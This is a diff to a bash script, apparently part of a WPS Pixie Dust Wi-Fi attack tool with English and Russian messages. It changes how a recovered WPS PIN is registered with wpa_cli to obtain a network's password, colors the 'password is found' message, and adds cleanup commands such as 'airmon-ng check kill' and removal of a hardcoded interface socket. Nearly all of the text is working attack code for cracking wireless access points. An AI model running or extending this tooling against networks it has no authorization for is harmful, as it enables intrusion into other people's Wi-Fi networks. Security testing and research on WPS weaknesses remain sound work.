@@ -160,8 +160,8 @@ Strings34["English"]="Wait for 1 minite."
 Strings34["Russian"]="Подождите 1 минуту."
 
 declare -A Strings35
-Strings35["English"]="The password is found: "
-Strings35["Russian"]="Найден пароль: "
+Strings35["English"]="\033[0;32mThe password is found: \e[0m"
+Strings35["Russian"]="\033[0;32mНайден пароль: \e[0m"
 
 declare -A Strings36
 Strings36["English"]="The password is not found. It is worth trying again."
@@ -354,7 +354,8 @@ function PixieDustAattack {
 						echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
 						sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 						sleep 3
-						echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$i" | awk '{print $1}') $PIN" | sudo wpa_cli
+#						echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$COUNTER" | awk '{print $1}') $PIN" | sudo wpa_cli
+						echo "wps_reg $i $PIN" | sudo wpa_cli
 
 						echo -e ${Strings34[$LANGUAGE]}
 						sleep 60		
@@ -363,6 +364,9 @@ function PixieDustAattack {
 						else 
 							echo -e ${Strings36[$LANGUAGE]}
 						fi
+
+						sudo rm /var/run/wpa_supplicant/wlp0s12u2
+						sudo airmon-ng check kill
 
 						rm /tmp/suppl.conf
 						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
@@ -538,6 +542,7 @@ function showWPAPassFromPin {
 		fi
 
 		rm /tmp/suppl.conf
+		sudo airmon-ng check kill
 		exit
 		if [ $REPLY -eq 11 ]; then
 			echo "=============================================================="
